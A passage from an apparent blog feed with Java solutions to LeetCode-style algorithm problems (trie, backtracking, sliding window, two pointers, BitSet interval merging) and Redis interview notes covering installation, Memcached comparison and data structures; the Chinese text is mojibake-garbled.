(<span class="type">char</span> c :</span><br><span class="line">                    s.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur.child[c - <span class="string">&#x27;a&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur.child[c - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">TrieNode</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur.child[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            cur.isEnd = <span class="literal">true</span>;</span><br><span class="line">            cur.val = s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="39-ç»„åˆæ€»å’Œ"><a href="#39-ç»„åˆæ€»å’Œ" class="headerlink" title=" 39. ç»„åˆæ€»å’Œ"></a><a href="https://leetcode-cn.com/problems/combination-sum"> 39. ç»„åˆæ€»å’Œ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        ArrayList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        backtrack(candidates, target, res, <span class="number">0</span>, path);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, List&lt;List&lt;Integer&gt;&gt; res, <span class="type">int</span> i, ArrayList&lt;Integer&gt; path)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (target == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i; start &lt; candidates.length; start++) &#123;</span><br><span class="line">            path.add(candidates[start]);</span><br><span class="line">            backtrack(candidates, target - candidates[start], res, start, path);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h2><h3 id="å‰‘æŒ‡-Offer-59-I-æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"><a href="#å‰‘æŒ‡-Offer-59-I-æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼" class="headerlink" title="å‰‘æŒ‡ Offer 59 - I. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼"></a><a href="https://leetcode-cn.com/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof/">å‰‘æŒ‡ Offer 59 - I. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å•è°ƒé˜Ÿåˆ—</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length - k + <span class="number">1</span>];</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[<span class="number">0</span>] = deque.peekFirst();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i - k] == deque.peekFirst()) &#123;</span><br><span class="line">                deque.pollFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast()) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(nums[i]);</span><br><span class="line">            res[j++] = deque.peekFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><h3 id="å‰‘æŒ‡-Offer-16-æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹"><a href="#å‰‘æŒ‡-Offer-16-æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹" class="headerlink" title="å‰‘æŒ‡ Offer 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹"></a><a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">å‰‘æŒ‡ Offer 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">if</span>(n == -<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span> / x;</span><br><span class="line">        <span class="type">double</span> <span class="variable">half</span> <span class="operator">=</span> myPow(x, n / <span class="number">2</span>);</span><br><span class="line">        <span class="type">double</span> <span class="variable">mod</span> <span class="operator">=</span> myPow(x, n % <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> half * half * mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-28-å¯¹ç§°çš„äºŒå‰æ ‘"><a href="#å‰‘æŒ‡-Offer-28-å¯¹ç§°çš„äºŒå‰æ ‘" class="headerlink" title="å‰‘æŒ‡ Offer 28. å¯¹ç§°çš„äºŒå‰æ ‘"></a><a href="https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/">å‰‘æŒ‡ Offer 28. å¯¹ç§°çš„äºŒå‰æ ‘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> helper(root.left, root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root1, TreeNode root2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> &amp;&amp; root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">null</span> || root2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root1.val == root2.val &amp;&amp; helper(root1.left, root2.right) &amp;&amp; helper(root1.right, root2.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><h3 id="å‰‘æŒ‡-Offer-61-æ‰‘å…‹ç‰Œä¸­çš„é¡ºå­"><a href="#å‰‘æŒ‡-Offer-61-æ‰‘å…‹ç‰Œä¸­çš„é¡ºå­" class="headerlink" title="å‰‘æŒ‡ Offer 61. æ‰‘å…‹ç‰Œä¸­çš„é¡ºå­"></a><a href="https://leetcode-cn.com/problems/bu-ke-pai-zhong-de-shun-zi-lcof/">å‰‘æŒ‡ Offer 61. æ‰‘å…‹ç‰Œä¸­çš„é¡ºå­</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç”¨setåˆ¤æ–­é‡å¤, åˆé‡å¤åˆ™ä¸å¯èƒ½æ˜¯é¡ºå­; ç”¨maxå’Œminè®°å½•æœ€å¤§æœ€å°å€¼, å¦‚æœmax - min &lt; 5ä¸”æ²¡æœ‰é‡å¤å°±æ˜¯é¡ºå­;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isStraight</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; repeat = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>, min = <span class="number">14</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(num, max);</span><br><span class="line">            min = Math.min(num, min);</span><br><span class="line">            <span class="keyword">if</span> (repeat.contains(num)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            repeat.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max - min &lt; <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h2><h3 id="å‰‘æŒ‡-Offer-57-å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—"><a href="#å‰‘æŒ‡-Offer-57-å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—" class="headerlink" title="å‰‘æŒ‡ Offer 57. å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-liang-ge-shu-zi-lcof/">å‰‘æŒ‡ Offer 57. å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æœ‰åºç”¨åŒæŒ‡é’ˆ, æ— åºç”¨mapæˆ–è€…set</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            sum = nums[l] + nums[r];</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;nums[l], nums[r]&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h2><h3 id="56-åˆå¹¶åŒºé—´"><a href="#56-åˆå¹¶åŒºé—´" class="headerlink" title="56. åˆå¹¶åŒºé—´"></a><a href="https://leetcode-cn.com/problems/merge-intervals">56. åˆå¹¶åŒºé—´</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] merge(<span class="type">int</span>[][] intervals) &#123;</span><br><span class="line">        <span class="type">BitSet</span> <span class="variable">bitSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BitSet</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] interval :</span><br><span class="line">                intervals) &#123;</span><br><span class="line">            <span class="comment">// æ¯”å¦‚[1,4]å’Œ[5,6]ä¸¤ä¸ªåŒºé—´åœ¨æ•°è½´ä¸Šæ˜¯ä¸è¿ç»­çš„ï¼Œä½†åœ¨BitSetä¸Šå´æ˜¯è¿ç»­çš„ã€‚</span></span><br><span class="line">            <span class="comment">// ä¹˜2æ˜¯ä¸ºäº†è®©å®ƒä»¬ä»BitSetä¸Šçœ‹ä¹Ÿæ˜¯ä¸è¿ç»­çš„</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> interval[<span class="number">1</span>] * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            bitSet.set(interval[<span class="number">0</span>] * <span class="number">2</span>, tmp, <span class="literal">true</span>);</span><br><span class="line">            max = tmp &gt;= max ? tmp : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &lt; max) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> bitSet.nextSetBit(index);</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> bitSet.nextClearBit(start);</span><br><span class="line">            <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;start / <span class="number">2</span>, (end - <span class="number">1</span>) / <span class="number">2</span>&#125;;</span><br><span class="line">            intervals[count++] = tmp;</span><br><span class="line">            index = end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[count][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            res[i] = intervals[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis</title>
    <url>/2022/02/26/%E9%9D%A2%E8%AF%95/Redis/</url>
    <content><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>epoll-wait redisä¸é˜»å¡ï¼Œ nginxä¼šé˜»å¡ï¼Œå› ä¸ºmaterè´Ÿè´£è¿æ¥ï¼Œworkerå·¥ä½œï¼Œæ‰€ä»¥ä¸éœ€è¦éé˜»å¡ã€‚</p>
<p>é‡‡ç”¨å¼±ä¸€è‡´æ€§ï¼Œå› ä¸ºæ˜¯ç¼“å­˜ã€‚</p>
<p>æœ€ç»ˆä¸€è‡´æ€§ï¼ˆæ²¡æœ‰ç”¨è¿™ç§ï¼‰ã€‚</p>
<p>åšäº‘åŸç”Ÿï¼ŒåŠ¨æ€æ‰©ç¼©å®¹ï¼Œéœ€è¦æœåŠ¡æ— çŠ¶æ€ï¼Œéšæ„åŠ æœåŠ¡å™¨ã€‚</p>
<h2 id="Redis-6-2-2-å®‰è£…"><a href="#Redis-6-2-2-å®‰è£…" class="headerlink" title="Redis 6.2.2 å®‰è£…"></a>Redis 6.2.2 å®‰è£…</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">ä¸‹è½½å’Œç¼–è¯‘çš„è¿‡ç¨‹</span></span><br><span class="line">wget https://download.redis.io/releases/redis-6.2.2.tar.gz</span><br><span class="line">tar xzf redis-6.2.2.tar.gz</span><br><span class="line">cd redis-6.2.2 &amp;&amp; vi README.md</span><br><span class="line">make</span><br><span class="line">yum install gcc -y</span><br><span class="line">make distclean</span><br><span class="line">make</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£…è¿‡ç¨‹</span></span><br><span class="line">make PREFIX=/opt/bigdata/redis6 install</span><br><span class="line">vi /etc/profile</span><br><span class="line">export REDIS_HOME=/opt/bigdata/redis6</span><br><span class="line">export PATH=$PATH:$REDIS_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line">cd utils</span><br><span class="line">./install_server.sh</span><br></pre></td></tr></table></figure>

<h2 id="Redisç®€ä»‹"><a href="#Redisç®€ä»‹" class="headerlink" title="Redisç®€ä»‹"></a>Redisç®€ä»‹</h2><p>ä½¿ç”¨cè¯­è¨€å¼€å‘çš„æ•°æ®åº“ï¼Œæ•°æ®å­˜åœ¨å†…å­˜ä¸­ï¼Œè¯»å†™é€Ÿåº¦éå¸¸å¿«ã€‚</p>
<p>redisè¢«å¹¿æ³›åº”ç”¨åœ¨ç¼“å­˜æ–¹å‘ï¼Œåˆ†å¸ƒå¼é”ï¼Œ ç”šè‡³æ¶ˆæ¯é˜Ÿåˆ—ã€‚ </p>
<p>æ”¯æŒäº‹åŠ¡ï¼ŒæŒä¹…åŒ–ï¼Œluaè„šæœ¬å’Œå¤šç§é›†ç¾¤æ–¹æ¡ˆã€‚</p>
<h2 id="åˆ†å¸ƒå¼ç¼“å­˜å¸¸è§æŠ€æœ¯é€‰å‹æ–¹æ¡ˆæœ‰å“ªäº›"><a href="#åˆ†å¸ƒå¼ç¼“å­˜å¸¸è§æŠ€æœ¯é€‰å‹æ–¹æ¡ˆæœ‰å“ªäº›" class="headerlink" title="åˆ†å¸ƒå¼ç¼“å­˜å¸¸è§æŠ€æœ¯é€‰å‹æ–¹æ¡ˆæœ‰å“ªäº›?"></a>åˆ†å¸ƒå¼ç¼“å­˜å¸¸è§æŠ€æœ¯é€‰å‹æ–¹æ¡ˆæœ‰å“ªäº›?</h2><p>Memcachedå’Œredis , åˆ†å¸ƒå¼ç¼“å­˜ä¸»è¦è§£å†³å•æœºç¼“å­˜çš„å®¹é‡å—æœåŠ¡å™¨é™åˆ¶å¹¶ä¸”æ— æ³•ä¿å­˜é€šç”¨ä¿¡æ¯çš„é—®é¢˜ã€‚</p>
<p>æœ¬åœ°ç¼“å­˜åªåœ¨å½“å‰æœåŠ¡æœ‰æ•ˆï¼Œå¦‚æœä½ éƒ¨ç½²äº†ä¸¤ä¸ªç›¸åŒçš„æœåŠ¡ï¼Œä»–ä»¬ä¸¤è€…ä¹‹é—´çš„ç¼“å­˜æ•°æ®æ˜¯æ— æ³•å…±é€šçš„ã€‚</p>
<h2 id="Rediså’ŒMemcached"><a href="#Rediså’ŒMemcached" class="headerlink" title="Rediså’ŒMemcached"></a>Rediså’ŒMemcached</h2><p><strong>ç›¸åŒç‚¹:</strong> </p>
<ul>
<li><p>åŸºäºå†…å­˜ï¼Œç”¨ä½œç¼“å­˜ã€‚</p>
</li>
<li><p>éƒ½æœ‰è¿‡æœŸç­–ç•¥ã€‚</p>
</li>
<li><p>æ€§èƒ½éƒ½æ¯”è¾ƒé«˜ã€‚</p>
</li>
</ul>
<p><strong>åŒºåˆ«:</strong> </p>
<ul>
<li><p>redisæ”¯æŒæ›´ä¸°å¯Œçš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ï¼šstringï¼Œ listï¼Œhashï¼Œsetï¼Œsorted setï¼Œbitmapï¼› måªæ”¯æŒæœ€ç®€å•çš„k&#x2F;væ•°æ®ç±»å‹ã€‚</p>
</li>
<li><p>redisæ”¯æŒæŒä¹…åŒ–ï¼› redisæœ‰å®¹ç¾æ¢å¤æœºåˆ¶ï¼Œå› ä¸ºå¯ä»¥æŒä¹…åŒ–ï¼› måœ¨æœåŠ¡å™¨å†…å­˜ç”¨å®ŒåæŠ¥å¼‚å¸¸ï¼Œrediså¯ä»¥å°†ä¸ç”¨çš„æ•°æ®æ”¾åˆ°ç£ç›˜ã€‚ </p>
</li>
<li><p>redisåŸç”Ÿæ”¯æŒclusteræ¨¡å¼ï¼› mä¸è¡Œï¼Œå¾—é å®¢æˆ·ç«¯æ¥å®ç°å¾€é›†ç¾¤ä¸­åˆ†ç‰‡å†™å…¥æ•°æ®ã€‚ </p>
</li>
<li><p>redisä½¿ç”¨å•çº¿ç¨‹å¤šè·¯ioå¤ç”¨æ¨¡å‹ï¼ˆredis6 å¼•å…¥å¤šçº¿ç¨‹ioï¼Œé»˜è®¤æ˜¯å…³é—­çš„ï¼‰ï¼Œ mæ˜¯å¤šçº¿ç¨‹éé˜»å¡ioå¤ç”¨æ¨¡å‹ã€‚</p>
</li>
<li><p>redisæ”¯æŒå‘å¸ƒè®¢é˜…æ¨¡å‹ï¼Œluaè„šæœ¬ï¼Œäº‹åŠ¡ç­‰ç‰¹æ€§ï¼Œè€Œmä¸æ”¯æŒï¼Œ redisè¿˜æ”¯æŒæ›´å¤šçš„ç¼–ç¨‹è¯­è¨€ã€‚</p>
</li>
<li><p>redisè¿‡æœŸåˆ é™¤ç­–ç•¥åŒæ—¶ä½¿ç”¨æƒ°æ€§åˆ é™¤å’Œå®šæœŸåˆ é™¤ï¼Œè€Œmåªç”¨æƒ°æ€§åˆ é™¤ã€‚</p>
</li>
<li><p>redisè®¡ç®—å‘æ•°æ®ç§»åŠ¨ï¼Œèƒ½ç›´æ¥å–åˆ°å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå€¼ï¼Œè€Œmåªä¼šè¿”å›æ•´ä¸ªæ•°ç»„ï¼Œæµªè´¹ç½‘ç»œioèµ„æºã€‚</p>
</li>
</ul>
<h2 id="ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜-redis"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜-redis" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜(redis)"></a>ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜(redis)</h2><p>é«˜æ€§èƒ½ï¼Œé«˜å¹¶å‘ï¼Œ mysql qps 1wï¼ˆ4æ ¸8gï¼‰, ç”¨redisèƒ½åˆ°10w+ï¼Œç”šè‡³30w+(å•æœº)ã€‚</p>
<h2 id="Rediså¸¸ç”¨æ•°æ®ç»“æ„"><a href="#Rediså¸¸ç”¨æ•°æ®ç»“æ„" class="headerlink" title="Rediså¸¸ç”¨æ•°æ®ç»“æ„"></a>Rediså¸¸ç”¨æ•°æ®ç»“æ„</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>set mset mget get strlen exists  incr setex del expire setex ttl</p>
<p>éœ€è¦è®¡æ•°çš„åœºæ™¯ï¼Œç”¨æˆ·è®¿é—®æ¬¡æ•°ï¼Œçƒ­ç‚¹æ–‡ç« çš„ç‚¹èµè½¬å‘æ•°é‡ç­‰ã€‚</p>
<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>rpush pop plush pop lrange llen</p>
<p>åŒå‘é“¾è¡¨ï¼Œå‘å¸ƒä¸è®¢é˜…æˆ–è€…æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ…¢æŸ¥è¯¢ã€‚</p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>hset hmset exists hget hgetall keys hvals; hashmap</p>
<p>ç³»ç»Ÿä¸­çš„å¯¹è±¡å­˜å‚¨ã€‚</p>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>sadd spop smembers sismember scard sinterstore sunion</p>
<p>éœ€è¦å­˜æ”¾çš„æ•°æ®ä¸èƒ½é‡å¤ä»¥åŠéœ€è¦è·å–å¤šä¸ªæ•°æ®æºäº¤é›†å’Œå¹¶é›†ç­‰åœºæ™¯ï¼Œ å…±åŒå¥½å‹ï¼ˆäº¤é›†ï¼‰ï¼Œ æ¨èå¥½å‹ï¼ˆå·®é›†ï¼‰ï¼Œå°½é‡ä¸ç”¨ï¼Œäº¤é›†å’Œå·®é›†éƒ½æ¯”è¾ƒè€—æ—¶ã€‚</p>
<h3 id="Sorted-set"><a href="#Sorted-set" class="headerlink" title="Sorted set"></a>Sorted set</h3><p>zadd zcard score range zrevrange zrem</p>
<p>é€šè¿‡è®¾ç½®çš„æƒé‡æ’åºï¼Œé»˜è®¤å‡åºï¼Œæƒé‡ä¸€æ ·åˆ™æŒ‰acsiiç æ’åºã€‚éœ€è¦å¯¹æ•°æ®æ ¹æ®æŸä¸ªæƒé‡è¿›è¡Œæ’åºçš„åœºæ™¯ï¼Œæ¯”å¦‚ç›´æ’­ç³»ç»Ÿä¸­ï¼Œå®æ—¶æ’è¡Œä¿¡æ¯åŒ…å«ç›´æ’­é—´åœ¨çº¿ç”¨æˆ·åˆ—è¡¨ï¼Œå„ç§ç¤¼ç‰©æ’è¡Œæ¦œï¼Œå¼¹å¹•æ¶ˆæ¯ï¼ˆå¯ä»¥ç†è§£ä¸ºæŒ‰æ¶ˆæ¯ç»´åº¦çš„æ¶ˆæ¯æ’è¡Œæ¦œï¼‰ç­‰ä¿¡æ¯ã€‚ </p>
<h3 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a>Bitmap</h3><p>setbit getbit bitcount bitop</p>
<p>æ˜¯å¦ç­¾åˆ°ï¼Œæ˜¯å¦ç™»å½•ï¼Œæ´»è·ƒç”¨æˆ·æƒ…å†µï¼Œç”¨æˆ·è¡Œä¸ºç»Ÿè®¡ï¼ˆæ˜¯å¦ç‚¹èµè¿‡æŸä¸ªè§†é¢‘ï¼‰ã€‚ </p>
<h2 id="Skiplistè·³è¡¨-zset"><a href="#Skiplistè·³è¡¨-zset" class="headerlink" title="Skiplistè·³è¡¨(zset)"></a>Skiplistè·³è¡¨(zset)</h2><p>æŸ¥è¯¢æ˜¯å¦ä¸ºskiplistï¼šOBJECT encoding k1ã€‚</p>
<p>æ•°æ®å¾ˆå°‘ä¸ºziplistï¼Œæ•°æ®å¤šçš„è¯ä¼šå˜ä¸ºskiplistã€‚</p>
<p>æœ€é«˜32å±‚ï¼Œè·³è¡¨å°±æ˜¯é“¾è¡¨ä¸äºŒåˆ†æ³•çš„ç»“åˆï¼Œé“¾è¡¨ä»å¤´èŠ‚ç‚¹åˆ°å°¾èŠ‚ç‚¹éƒ½æ˜¯æœ‰åºçš„ã€‚</p>
<p>å¯ä»¥è¿›è¡Œè·³è·ƒæŸ¥æ‰¾ï¼ˆå½¢å¦‚äºŒåˆ†æ³•ï¼‰ï¼Œé™ä½æ—¶é—´å¤æ‚åº¦ã€‚</p>
